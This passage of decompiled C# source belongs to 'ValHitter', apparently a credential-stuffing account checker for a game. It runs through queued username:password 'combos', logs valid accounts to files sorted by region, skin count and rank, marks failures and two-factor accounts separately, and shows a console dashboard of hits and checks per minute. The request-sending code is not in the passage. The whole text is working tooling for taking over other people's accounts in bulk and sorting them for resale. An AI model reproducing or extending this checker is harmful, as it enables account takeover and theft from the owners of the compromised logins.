								bool flag163 = num > 10 && ((num < 20) & str21.Contains("false")) && str13.Contains("ap");
								if (flag163)
								{
									Checker.apu20();
									Checker.apb20("10-20", textToAppend);
									Checker.apb20("UserPass", result);
								}
								bool flag164 = num > 20 && ((num < 30) & str21.Contains("false")) && str13.Contains("ap");
								if (flag164)
								{
									Checker.apu30();
									Checker.apb30("20-30", textToAppend);
									Checker.apb30("UserPass", result);
								}
								bool flag165 = num > 30 && ((num < 50) & str21.Contains("false")) && str13.Contains("ap");
								if (flag165)
								{
									Checker.apu50();
									Checker.apb50("30-50", textToAppend);
									Checker.apb50("UserPass", result);
								}
								bool flag166 = num > 50 && ((num < 80) & str21.Contains("false")) && str13.Contains("ap");
								if (flag166)
								{
									Checker.apu80();
									Checker.apb80("50-80", textToAppend);
									Checker.apb80("UserPass", result);
								}
								bool flag167 = num > 80 && ((num < 100) & str21.Contains("false")) && str13.Contains("ap");
								if (flag167)
								{
									Checker.apu100();
									Checker.apb100("80-100", textToAppend);
									Checker.apb100("UserPass", result);
								}
								bool flag168 = num > 100 && ((num < 150) & str21.Contains("false")) && str13.Contains("ap");
								if (flag168)
								{
									Checker.apu150();
									Checker.apb150("100-150", textToAppend);
									Checker.apb150("UserPass", result);
								}
								bool flag169 = num > 150 && ((num < 200) & str21.Contains("false")) && str13.Contains("ap");
								if (flag169)
								{
									Checker.apu200();
									Checker.apb200("150-200", textToAppend);
									Checker.apb200("UserPass", result);
								}
								bool flag170 = num > 200 && ((num < 1000) & str21.Contains("false")) && str13.Contains("ap");
								if (flag170)
								{
									Checker.apu250();
									Checker.apb2000("200++", textToAppend);
									Checker.apb2000("UserPass", result);
								}
								bool flag171 = num > 1 && ((num < 10) & str21.Contains("false")) && str13.Contains("eu");
								if (flag171)
								{
									Checker.euu10();
									Checker.eub10("1-10", textToAppend);
									Checker.eub10("UserPass", result);
								}
								bool flag172 = num > 10 && ((num < 20) & str21.Contains("false")) && str13.Contains("eu");
								if (flag172)
								{
									Checker.euu20();
									Checker.eub20("10-20", textToAppend);
									Checker.eub20("UserPass", result);
								}
								bool flag173 = num > 20 && ((num < 30) & str21.Contains("false")) && str13.Contains("eu");
								if (flag173)
								{
									Checker.euu30();
									Checker.eub30("20-30", textToAppend);
									Checker.eub30("UserPass", result);
								}
								bool flag174 = num > 30 && ((num < 50) & str21.Contains("false")) && str13.Contains("eu");
								if (flag174)
								{
									Checker.euu50();
									Checker.eub50("30-50", textToAppend);
									Checker.eub50("UserPass", result);
								}
								bool flag175 = num > 50 && ((num < 80) & str21.Contains("false")) && str13.Contains("eu");
								if (flag175)
								{
									Checker.euu80();
									Checker.eub80("50-80", textToAppend);
									Checker.eub80("UserPass", result);
								}
								bool flag176 = num > 80 && ((num < 100) & str21.Contains("false")) && str13.Contains("eu");
								if (flag176)
								{
									Checker.euu100();
									Checker.eub100("80-100", textToAppend);
									Checker.eub100("UserPass", result);
								}
								bool flag177 = num > 100 && ((num < 150) & str21.Contains("false")) && str13.Contains("eu");
								if (flag177)
								{
									Checker.euu150();
									Checker.eub150("100-150", textToAppend);
									Checker.eub150("UserPass", result);
								}
								bool flag178 = num > 150 && ((num < 200) & str21.Contains("false")) && str13.Contains("eu");
								if (flag178)
								{
									Checker.euu200();
									Checker.eub200("150-200", textToAppend);
									Checker.eub200("UserPass", result);
								}
								bool flag179 = num > 200 && ((num < 1000) & str21.Contains("false")) && str13.Contains("eu");
								if (flag179)
								{
									Checker.euu250();
									Checker.eub2000("200++", textToAppend);
									Checker.eub2000("UserPass", result);
								}
								bool flag180 = num > 1 && ((num < 10) & str21.Contains("false")) && str13.Contains("kr");
								if (flag180)
								{
									Checker.kru10();
									Checker.krb10("1-10", textToAppend);
									Checker.krb10("UserPass", result);
								}
								bool flag181 = num > 10 && ((num < 20) & str21.Contains("false")) && str13.Contains("kr");
								if (flag181)
								{
									Checker.kru20();
									Checker.krb20("10-20", textToAppend);
									Checker.krb20("UserPass", result);
								}
								bool flag182 = num > 20 && ((num < 30) & str21.Contains("false")) && str13.Contains("kr");
								if (flag182)
								{
									Checker.kru30();
									Checker.krb30("20-30", textToAppend);
									Checker.krb30("UserPass", result);
								}
								bool flag183 = num > 30 && ((num < 50) & str21.Contains("false")) && str13.Contains("kr");
								if (flag183)
								{
									Checker.kru50();
									Checker.krb50("30-50", textToAppend);
									Checker.krb50("UserPass", result);
								}
								bool flag184 = num > 50 && ((num < 80) & str21.Contains("false")) && str13.Contains("kr");
								if (flag184)
								{
									Checker.kru80();
									Checker.krb80("50-80", textToAppend);
									Checker.krb80("UserPass", result);
								}
								bool flag185 = num > 80 && ((num < 100) & str21.Contains("false")) && str13.Contains("kr");
								if (flag185)
								{
									Checker.kru100();
									Checker.krb100("80-100", textToAppend);
									Checker.krb100("UserPass", result);
								}
								bool flag186 = num > 100 && ((num < 150) & str21.Contains("false")) && str13.Contains("kr");
								if (flag186)
								{
									Checker.kru150();
									Checker.krb150("100-150", textToAppend);
									Checker.krb150("UserPass", result);
								}
								bool flag187 = num > 150 && ((num < 200) & str21.Contains("false")) && str13.Contains("kr");
								if (flag187)
								{
									Checker.kru200();
									Checker.krb200("150-200", textToAppend);
									Checker.krb200("UserPass", result);
								}
								bool flag188 = num > 200 && ((num < 1000) & str21.Contains("false")) && str13.Contains("kr");
								if (flag188)
								{
									Checker.kru250();
									Checker.krb2000("200++", textToAppend);
									Checker.krb2000("UserPass", result);
								}
								bool flag189 = num > 1 && ((num < 10) & str21.Contains("false")) && str13.Contains("latam");
								if (flag189)
								{
									Checker.nau10();
									Checker.nas10("1-10", textToAppend);
									Checker.nas10("UserPass", result);
								}
								bool flag190 = num > 10 && ((num < 20) & str21.Contains("false")) && str13.Contains("latam");
								if (flag190)
								{
									Checker.nau20();
									Checker.nas20("10-20", textToAppend);
									Checker.nas20("UserPass", result);
								}
								bool flag191 = num > 20 && ((num < 30) & str21.Contains("false")) && str13.Contains("latam");
								if (flag191)
								{
									Checker.nau30();
									Checker.nas30("20-30", textToAppend);
									Checker.nas30("UserPass", result);
								}
								bool flag192 = num > 30 && ((num < 50) & str21.Contains("false")) && str13.Contains("latam");
								if (flag192)
								{
									Checker.nau50();
									Checker.nas50("30-50", textToAppend);
									Checker.nas50("UserPass", result);
								}
								bool flag193 = num > 50 && ((num < 80) & str21.Contains("false")) && str13.Contains("latam");
								if (flag193)
								{
									Checker.nau80();
									Checker.nas80("50-80", textToAppend);
									Checker.nas80("UserPass", result);
								}
								bool flag194 = num > 80 && ((num < 100) & str21.Contains("false")) && str13.Contains("latam");
								if (flag194)
								{
									Checker.nau100();
									Checker.nas100("80-100", textToAppend);
									Checker.nas100("UserPass", result);
								}
								bool flag195 = num > 100 && ((num < 150) & str21.Contains("false")) && str13.Contains("latam");
								if (flag195)
								{
									Checker.nau150();
									Checker.nas150("100-150", textToAppend);
									Checker.nas150("UserPass", result);
								}
								bool flag196 = num > 150 && ((num < 200) & str21.Contains("false")) && str13.Contains("latam");
								if (flag196)
								{
									Checker.nau200();
									Checker.nas200("150-200", textToAppend);
									Checker.nas200("UserPass", result);
								}
								bool flag197 = num > 200 && ((num < 1000) & str21.Contains("false")) && str13.Contains("latam");
								if (flag197)
								{
									Checker.nau250();
									Checker.nas2000("200++", textToAppend);
									Checker.nas2000("UserPass", result);
								}
								bool flag198 = num > 1 && ((num < 10) & str21.Contains("false")) && str13.Contains("br");
								if (flag198)
								{
									Checker.nau10();
									Checker.nas10("1-10", textToAppend);
									Checker.nas10("UserPass", result);
								}
								bool flag199 = num > 10 && ((num < 20) & str21.Contains("false")) && str13.Contains("br");
								if (flag199)
								{
									Checker.nau20();
									Checker.nas20("10-20", textToAppend);
									Checker.nas20("UserPass", result);
								}
								bool flag200 = num > 20 && ((num < 30) & str21.Contains("false")) && str13.Contains("br");
								if (flag200)
								{
									Checker.nau30();
									Checker.nas30("20-30", textToAppend);
									Checker.nas30("UserPass", result);
								}
								bool flag201 = num > 30 && ((num < 50) & str21.Contains("false")) && str13.Contains("br");
								if (flag201)
								{
									Checker.nau50();
									Checker.nas50("30-50", textToAppend);
									Checker.nas50("UserPass", result);
								}
								bool flag202 = num > 50 && ((num < 80) & str21.Contains("false")) && str13.Contains("br");
								if (flag202)
								{
									Checker.nau80();
									Checker.nas80("50-80", textToAppend);
									Checker.nas80("UserPass", result);
								}
								bool flag203 = num > 80 && ((num < 100) & str21.Contains("false")) && str13.Contains("br");
								if (flag203)
								{
									Checker.nau100();
									Checker.nas100("80-100", textToAppend);
									Checker.nas100("UserPass", result);
								}
								bool flag204 = num > 100 && ((num < 150) & str21.Contains("false")) && str13.Contains("br");
								if (flag204)
								{
									Checker.nau150();
									Checker.nas150("100-150", textToAppend);
									Checker.nas150("UserPass", result);
								}
								bool flag205 = num > 150 && ((num < 200) & str21.Contains("false")) && str13.Contains("br");
								if (flag205)
								{
									Checker.nau200();
									Checker.nas200("150-200", textToAppend);
									Checker.nas200("UserPass", result);
								}
								bool flag206 = num > 200 && ((num < 1000) & str21.Contains("false")) && str13.Contains("br");
								if (flag206)
								{
									Checker.nau250();
									Checker.nas2000("200++", textToAppend);
									Checker.nas2000("UserPass", result);
								}
								bool flag207 = num > 1 && ((num < 10) & str21.Contains("true")) && str13.Contains("na");
								if (flag207)
								{
									Checker.nav10();
									Checker.nac10("1-10", textToAppend);
									Checker.nac10("UserPass", result);
								}
								bool flag208 = num > 10 && ((num < 20) & str21.Contains("true")) && str13.Contains("na");
								if (flag208)
								{
									Checker.nav20();
									Checker.nac20("10-20", textToAppend);
									Checker.nac20("UserPass", result);
								}
								bool flag209 = num > 20 && ((num < 30) & str21.Contains("true")) && str13.Contains("na");
								if (flag209)
								{
									Checker.nav30();
									Checker.nac30("20-30", textToAppend);
									Checker.nac30("UserPass", result);
								}
								bool flag210 = num > 30 && ((num < 50) & str21.Contains("true")) && str13.Contains("na");
								if (flag210)
								{
									Checker.nav50();
									Checker.nac50("30-50", textToAppend);
									Checker.nac50("UserPass", result);
								}
								bool flag211 = num > 50 && ((num < 80) & str21.Contains("true")) && str13.Contains("na");
								if (flag211)
								{
									Checker.nav80();
									Checker.nac80("50-80", textToAppend);
									Checker.nac80("UserPass", result);
								}
								bool flag212 = num > 80 && ((num < 100) & str21.Contains("true")) && str13.Contains("na");
								if (flag212)
								{
									Checker.nav100();
									Checker.nac100("80-100", textToAppend);
									Checker.nac100("UserPass", result);
								}
								bool flag213 = num > 100 && ((num < 150) & str21.Contains("true")) && str13.Contains("na");
								if (flag213)
								{
									Checker.nav150();
									Checker.nac150("100-150", textToAppend);
									Checker.nac150("UserPass", result);
								}
								bool flag214 = num > 150 && ((num < 200) & str21.Contains("true")) && str13.Contains("na");
								if (flag214)
								{
									Checker.nav200();
									Checker.nac200("150-200", textToAppend);
									Checker.nac200("UserPass", result);
								}
								bool flag215 = num > 200 && ((num < 1000) & str21.Contains("true")) && str13.Contains("na");
								if (flag215)
								{
									Checker.nav250();
									Checker.nac2000("200++", textToAppend);
									Checker.nac2000("UserPass", result);
								}
								bool flag216 = num > 1 && ((num < 10) & str21.Contains("true")) && str13.Contains("ap");
								if (flag216)
								{
									Checker.apv10();
									Checker.apc10("1-10", textToAppend);
									Checker.apc10("UserPass", result);
								}
								bool flag217 = num > 10 && ((num < 20) & str21.Contains("true")) && str13.Contains("ap");
								if (flag217)
								{
									Checker.apv20();
									Checker.apc20("10-20", textToAppend);
									Checker.apc20("UserPass", result);
								}
								bool flag218 = num > 20 && ((num < 30) & str21.Contains("true")) && str13.Contains("ap");
								if (flag218)
								{
									Checker.apv30();
									Checker.apc30("20-30", textToAppend);
									Checker.apc30("UserPass", result);
								}
								bool flag219 = num > 30 && ((num < 50) & str21.Contains("true")) && str13.Contains("ap");
								if (flag219)
								{
									Checker.apv50();
									Checker.apc50("30-50", textToAppend);
									Checker.apc50("UserPass", result);
								}
								bool flag220 = num > 50 && ((num < 80) & str21.Contains("true")) && str13.Contains("ap");
								if (flag220)
								{
									Checker.apv80();
									Checker.apc80("50-80", textToAppend);
									Checker.apc80("UserPass", result);
								}
								bool flag221 = num > 80 && ((num < 100) & str21.Contains("true")) && str13.Contains("ap");
								if (flag221)
								{
									Checker.apv100();
									Checker.apc100("80-100", textToAppend);
									Checker.apc100("UserPass", result);
								}
								bool flag222 = num > 100 && ((num < 150) & str21.Contains("true")) && str13.Contains("ap");
								if (flag222)
								{
									Checker.apv150();
									Checker.apc150("100-150", textToAppend);
									Checker.apc150("UserPass", result);
								}
								bool flag223 = num > 150 && ((num < 200) & str21.Contains("true")) && str13.Contains("ap");
								if (flag223)
								{
									Checker.apv200();
									Checker.apc200("150-200", textToAppend);
									Checker.apc200("UserPass", result);
								}
								bool flag224 = num > 200 && ((num < 1000) & str21.Contains("true")) && str13.Contains("ap");
								if (flag224)
								{
									Checker.apv250();
									Checker.apc2000("200++", textToAppend);
									Checker.apc2000("UserPass", result);
								}
								bool flag225 = num > 1 && ((num < 10) & str21.Contains("true")) && str13.Contains("eu");
								if (flag225)
								{
									Checker.euv10();
									Checker.euc10("1-10", textToAppend);
									Checker.euc10("UserPass", result);
								}
								bool flag226 = num > 10 && ((num < 20) & str21.Contains("true")) && str13.Contains("eu");
								if (flag226)
								{
									Checker.euv20();
									Checker.euc20("10-20", textToAppend);
									Checker.euc20("UserPass", result);
								}
								bool flag227 = num > 20 && ((num < 30) & str21.Contains("true")) && str13.Contains("eu");
								if (flag227)
								{
									Checker.euv30();
									Checker.euc30("20-30", textToAppend);
									Checker.euc30("UserPass", result);
								}
								bool flag228 = num > 30 && ((num < 50) & str21.Contains("true")) && str13.Contains("eu");
								if (flag228)
								{
									Checker.euv50();
									Checker.euc50("30-50", textToAppend);
									Checker.euc50("UserPass", result);
								}
								bool flag229 = num > 50 && ((num < 80) & str21.Contains("true")) && str13.Contains("eu");
								if (flag229)
								{
									Checker.euv80();
									Checker.euc80("50-80", textToAppend);
									Checker.euc80("UserPass", result);
								}
								bool flag230 = num > 80 && ((num < 100) & str21.Contains("true")) && str13.Contains("eu");
								if (flag230)
								{
									Checker.euv100();
									Checker.euc100("80-100", textToAppend);
									Checker.euc100("UserPass", result);
								}
								bool flag231 = num > 100 && ((num < 150) & str21.Contains("true")) && str13.Contains("eu");
								if (flag231)
								{
									Checker.euv150();
									Checker.euc150("100-150", textToAppend);
									Checker.euc150("UserPass", result);
								}
								bool flag232 = num > 150 && ((num < 200) & str21.Contains("true")) && str13.Contains("eu");
								if (flag232)
								{
									Checker.euv200();
									Checker.euc200("150-200", textToAppend);
									Checker.euc200("UserPass", result);
								}
								bool flag233 = num > 200 && ((num < 1000) & str21.Contains("true")) && str13.Contains("eu");
								if (flag233)
								{
									Checker.euv250();
									Checker.euc2000("200++", textToAppend);
									Checker.euc2000("UserPass", result);
								}
								bool flag234 = num > 1 && ((num < 10) & str21.Contains("true")) && str13.Contains("kr");
								if (flag234)
								{
									Checker.krv10();
									Checker.krc10("1-10", textToAppend);
									Checker.krc10("UserPass", result);
								}
								bool flag235 = num > 10 && ((num < 20) & str21.Contains("true")) && str13.Contains("kr");
								if (flag235)
								{
									Checker.krv20();
									Checker.krc20("10-20", textToAppend);
									Checker.krc20("UserPass", result);
								}
								bool flag236 = num > 20 && ((num < 30) & str21.Contains("true")) && str13.Contains("kr");
								if (flag236)
								{
									Checker.krv30();
									Checker.krc30("20-30", textToAppend);
									Checker.krc30("UserPass", result);
								}
								bool flag237 = num > 30 && ((num < 50) & str21.Contains("true")) && str13.Contains("kr");
								if (flag237)
								{
									Checker.krv50();
									Checker.krc50("30-50", textToAppend);
									Checker.krc50("UserPass", result);
								}
								bool flag238 = num > 50 && ((num < 80) & str21.Contains("true")) && str13.Contains("kr");
								if (flag238)
								{
									Checker.krv80();
									Checker.krc80("50-80", textToAppend);
									Checker.krc80("UserPass", result);
								}
								bool flag239 = num > 80 && ((num < 100) & str21.Contains("true")) && str13.Contains("kr");
								if (flag239)
								{
									Checker.krv100();
									Checker.krc100("80-100", textToAppend);
									Checker.krc100("UserPass", result);
								}
								bool flag240 = num > 100 && ((num < 150) & str21.Contains("true")) && str13.Contains("kr");
								if (flag240)
								{
									Checker.krv150();
									Checker.krc150("100-150", textToAppend);
									Checker.krc150("UserPass", result);
								}
								bool flag241 = num > 150 && ((num < 200) & str21.Contains("true")) && str13.Contains("kr");
								if (flag241)
								{
									Checker.krv200();
									Checker.krc200("150-200", textToAppend);
									Checker.krc200("UserPass", result);
								}
								bool flag242 = num > 200 && ((num < 1000) & str21.Contains("true")) && str13.Contains("kr");
								if (flag242)
								{
									Checker.krv250();
									Checker.krc2000("200++", textToAppend);
									Checker.krc2000("UserPass", result);
								}
								bool flag243 = num > 1 && ((num < 10) & str21.Contains("true")) && str13.Contains("latam");
								if (flag243)
								{
									Checker.nav10();
									Checker.nac10("1-10", textToAppend);
									Checker.nac10("UserPass", result);
								}
								bool flag244 = num > 10 && ((num < 20) & str21.Contains("true")) && str13.Contains("latam");
								if (flag244)
								{
									Checker.nav20();
									Checker.nac20("10-20", textToAppend);
									Checker.nac20("UserPass", result);
								}
								bool flag245 = num > 20 && ((num < 30) & str21.Contains("true")) && str13.Contains("latam");
								if (flag245)
								{
									Checker.nav30();
									Checker.nac30("20-30", textToAppend);
									Checker.nac30("UserPass", result);
								}
								bool flag246 = num > 30 && ((num < 50) & str21.Contains("true")) && str13.Contains("latam");
								if (flag246)
								{
									Checker.nav50();
									Checker.nac50("30-50", textToAppend);
									Checker.nac50("UserPass", result);
								}
								bool flag247 = num > 50 && ((num < 80) & str21.Contains("true")) && str13.Contains("latam");
								if (flag247)
								{
									Checker.nav80();
									Checker.nac80("50-80", textToAppend);
									Checker.nac80("UserPass", result);
								}
								bool flag248 = num > 80 && ((num < 100) & str21.Contains("true")) && str13.Contains("latam");
								if (flag248)
								{
									Checker.nav100();
									Checker.nac100("80-100", textToAppend);
									Checker.nac100("UserPass", result);
								}
								bool flag249 = num > 100 && ((num < 150) & str21.Contains("true")) && str13.Contains("latam");
								if (flag249)
								{
									Checker.nav150();
									Checker.nac150("100-150", textToAppend);
									Checker.nac150("UserPass", result);
								}
								bool flag250 = num > 150 && ((num < 200) & str21.Contains("true")) && str13.Contains("latam");
								if (flag250)
								{
									Checker.nav200();
									Checker.nac200("150-200", textToAppend);
									Checker.nac200("UserPass", result);
								}
								bool flag251 = num > 200 && ((num < 1000) & str21.Contains("true")) && str13.Contains("latam");
								if (flag251)
								{
									Checker.nav250();
									Checker.nac2000("200++", textToAppend);
									Checker.nac2000("UserPass", result);
								}
								bool flag252 = num > 1 && ((num < 10) & str21.Contains("true")) && str13.Contains("br");
								if (flag252)
								{
									Checker.nav10();
									Checker.nac10("1-10", textToAppend);
									Checker.nac10("UserPass", result);
								}
								bool flag253 = num > 10 && ((num < 20) & str21.Contains("true")) && str13.Contains("br");
								if (flag253)
								{
									Checker.nav20();
									Checker.nac20("10-20", textToAppend);
									Checker.nac20("UserPass", result);
								}
								bool flag254 = num > 20 && ((num < 30) & str21.Contains("true")) && str13.Contains("br");
								if (flag254)
								{
									Checker.nav30();
									Checker.nac30("20-30", textToAppend);
									Checker.nac30("UserPass", result);
								}
								bool flag255 = num > 30 && ((num < 50) & str21.Contains("true")) && str13.Contains("br");
								if (flag255)
								{
									Checker.nav50();
									Checker.nac50("30-50", textToAppend);
									Checker.nac50("UserPass", result);
								}
								bool flag256 = num > 50 && ((num < 80) & str21.Contains("true")) && str13.Contains("br");
								if (flag256)
								{
									Checker.nav80();
									Checker.nac80("50-80", textToAppend);
									Checker.nac80("UserPass", result);
								}
								bool flag257 = num > 80 && ((num < 100) & str21.Contains("true")) && str13.Contains("br");
								if (flag257)
								{
									Checker.nav100();
									Checker.nac100("80-100", textToAppend);
									Checker.nac100("UserPass", result);
								}
								bool flag258 = num > 100 && ((num < 150) & str21.Contains("true")) && str13.Contains("br");
								if (flag258)
								{
									Checker.nav150();
									Checker.nac150("100-150", textToAppend);
									Checker.nac150("UserPass", result);
								}
								bool flag259 = num > 150 && ((num < 200) & str21.Contains("true")) && str13.Contains("br");
								if (flag259)
								{
									Checker.nav200();
									Checker.nac200("150-200", textToAppend);
									Checker.nac200("UserPass", result);
								}
								bool flag260 = num > 200 && ((num < 1000) & str21.Contains("true")) && str13.Contains("br");
								if (flag260)
								{
									Checker.nav250();
									Checker.nac2000("200++", textToAppend);
									Checker.nac2000("UserPass", result);
								}
							}
							catch (Exception ex)
							{
								Checker.Combos.Enqueue(result);
								Checker.Errors++;
							}
						}
						else
						{
							bool flag261 = data.Contains("auth_failure");
							if (flag261)
							{
								Checker.Invalid++;
								Checker.CPM_aux++;
								Checker.done++;
								Checker.AppendFile("Bad", result);
							}
							else
							{
								bool flag262 = data.Contains("multifactor");
								if (flag262)
								{
									Checker.twofactor++;
									Checker.CPM_aux++;
									Checker.done++;
									Checker.AppendFile("2FA's", result);
								}
								else
								{
									Checker.Combos.Enqueue(result);
									Checker.Errors++;
								}
							}
						}
					}
					catch (Exception ex2)
					{
						Checker.Combos.Enqueue(result);
						Checker.Errors++;
					}
				}
			}
		}
	}

	// Token: 0x06000004 RID: 4 RVA: 0x000070F8 File Offset: 0x000052F8
	public static void ConsoleUpdate()
	{
		while (Checker.Valid + Checker.Invalid != Checker.LoadedCombos)
		{
			Checker.ConsoleCallback();
		}
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00007128 File Offset: 0x00005328
	private static void ConsoleCallback()
	{
		string str = (Checker.CheckPerSec * 60).ToString();
		string str2 = Checker.Valid.ToString();
		string str3 = Checker.Invalid.ToString();
		string str4 = Checker.Errors.ToString();
		string str5 = Checker.Free.ToString();
		Colorful.Console.Title = string.Concat(new string[]
		{
			"ValHitter | Valid: ",
			str2,
			" | Invalid: ",
			str3,
			" | 2FA: ",
			str5,
			" | Errors: ",
			str4,
			" | Checked: ",
			Checker.done.ToString(),
			"/",
			Checker.LoadedCombos.ToString(),
			" | SKinned: ",
			Checker.Skinned.ToString(),
			" | CPM: ",
			str
		});
		Colorful.Console.Clear();
		Checker.CheckPerSec = Checker.CPM_aux;
		Checker.CPM_aux = 0;
		System.Console.SetWindowSize(System.Console.LargestWindowWidth, System.Console.LargestWindowHeight);
		Checker.ShowWindow(Checker.ThisConsole, 3);
		Colorful.Console.WriteLine();
		Utils.centerText("    .           .                .                     .                  .                   .          ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("        .       ██▒   █▓ ▄▄▄       ██▓     ██░ ██  ██▓▄▄██████▓▄▄██████▓▓█████  ██▀███    .         .    ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("               ▓██░   █▒▒████▄    ▓██▒    ▓██░ ██▒▓██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒                 ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("     .     .    ▓██  █▒░▒██  ▀█▄  ▒██░    ▒██▀▀██░▒██▒▒ ▓██░ ▒░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒                  ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("                 ▒██ █░░░██▄▄▄▄██ ▒██░    ░▓█ ░██ ░██░░ ▓██▓ ░ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     .             ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("     ████████     ▒▀█░   ▓█   ▓██▒░██████▒░▓█▒░██▓░██░  ▒██▒ ░   ▒██▒ ░ ░▒████▒░██▓ ▒██▒    ████████.    ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText(".███████          ░ ▐░   ▒   ▓▒█░░ ▒░▓  ░ ▒ ░░▒░▒░▓    ▒ ░░     ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░          ███████  ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("                    ░ ░░    ▒  ▒▒ ░░ ░ ▒  ░ ▒ ░▒░ ░ ▒ ░        .    ░     ░ ░.  ░  ░▒ ░ ▒░     .         ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("            .        ░░    ░   ▒     ░ ░    ░  ░░ ░ ▒ ░  ░       ░         ░     ░░   ░                . ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Utils.centerText("    .                 ░        ░  ░    ░  ░ ░  ░  ░ ░    .                  ░  ░   ░                     ", Color.FromArgb(StartMenu.red, 227, StartMenu.blue));
		Colorful.Console.WriteLine();
		Utils.centerText("- Made By CST Cryst#1552 -\n", Color.FromArgb(StartMenu.red, 107, StartMenu.blue));
		Colorful.Console.WriteLine();
		Checker.say("+");
		Utils.center2("Checked");
		Colorful.Console.Write("               ->:(");
		Checker.say2(Checker.done);
		Colorful.Console.Write("/");
		Checker.say2(Checker.LoadedCombos);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Good");
		Colorful.Console.Write("                  ->:(");
		Checker.say2(Checker.Valid);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Bad");
		Colorful.Console.Write("                   ->:(");
		Checker.say2(Checker.Invalid);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Errors");
		Colorful.Console.Write("                ->:(");
		Checker.say2(Checker.Errors);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		System.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("CPM");
		Colorful.Console.Write("                   ->:(");
		Checker.say2(Checker.CheckPerSec * 60);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skinned");
		Colorful.Console.Write("               ->:(");
		Checker.say2(Checker.Skinned);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("No Skinned");
		Colorful.Console.Write("            ->:(");
		Checker.say2(Checker.unskinned);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Banned");
		Colorful.Console.Write("                ->:(");
		Checker.say2(Checker.Banned);
		Colorful.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("2FA");
		Colorful.Console.Write("                   ->:(");
		Checker.say2(Checker.twofactor);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		System.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 1-10");
		Colorful.Console.Write("            ->:(");
		Colorful.Console.Write("");
		Checker.say2(Checker.ten);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 10-20");
		Colorful.Console.Write("           ->:(");
		Checker.say2(Checker.twenty);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 20-30");
		Colorful.Console.Write("           ->:(");
		Checker.say2(Checker.thirty);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 30-50");
		Colorful.Console.Write("           ->:(");
		Checker.say2(Checker.fifty);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 50-80");
		Colorful.Console.Write("           ->:(");
		Checker.say2(Checker.eighty);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 80-100");
		Colorful.Console.Write("          ->:(");
		Checker.say2(Checker.hundred);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 100-150");
		Colorful.Console.Write("         ->:(");
		Checker.say2(Checker.hundred1);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 150-200");
		Colorful.Console.Write("         ->:(");
		Checker.say2(Checker.hundred2);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Skins 200++");
		Colorful.Console.Write("           ->:(");
		Checker.say2(Checker.hundred3);
		System.Console.Write(")");
		Colorful.Console.WriteLine("");
		System.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Ranks>>:       [Verified]|[Unverified]");
		System.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Unrated>>:");
		Colorful.Console.Write("            [");
		Checker.say2(Checker.unrated);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.unratedu);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Iron>>:               [");
		Checker.say2(Checker.iron);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.ironu);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Bronze>>:             [");
		Checker.say2(Checker.bronze);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.bronzeu);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Silver>>:             [");
		Checker.say2(Checker.silver);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.silveru);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Gold>>:               [");
		Checker.say2(Checker.gold);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.goldu);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Platinum>>:           [");
		Checker.say2(Checker.plat);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.platu);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Diamond>>:            [");
		Checker.say2(Checker.dia);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.diau);
